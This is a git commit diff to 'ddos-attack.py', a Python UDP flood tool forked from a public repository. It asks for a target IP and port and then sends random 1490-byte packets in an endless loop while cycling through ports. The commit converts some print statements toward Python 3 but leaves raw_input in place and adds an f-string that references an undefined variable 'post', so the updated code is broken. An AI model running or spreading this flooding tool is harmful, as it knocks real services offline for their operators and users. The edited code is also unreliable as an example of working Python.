f39da5aa07bd7e2f77beb3c80164e0aa62625aa5
YIJANGs <153354935+YIJANGs@users.noreply.github.com>
2025-09-14 10:08:55 +0800

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -12,37 +12,28 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print "Author   : HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print
+print("Author   : HA-MRX")
+print("Change By: YIJANGs")
+print("Fork From : https://github.com/Ha3MrX/DDos-Attack")
+
+print()
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print(f"Sent {sent} packet to {ip} throught port: {post}")
      if port == 65534:
-       port = 1
+          port = 1
 
